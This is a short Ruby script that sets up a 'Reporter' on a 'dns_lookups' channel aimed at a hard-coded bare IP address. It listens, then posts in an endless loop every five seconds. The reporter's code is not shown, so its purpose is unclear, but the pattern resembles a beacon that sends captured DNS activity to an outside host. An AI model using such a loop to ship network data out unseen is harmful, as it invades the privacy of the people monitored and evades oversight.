require './reporter'

@reporter = Reporter.new(channel: 'dns_lookups', target_uri: '109.159.159.157/igloo')
@reporter.listen

while true do
	@reporter.post
	sleep 5
end
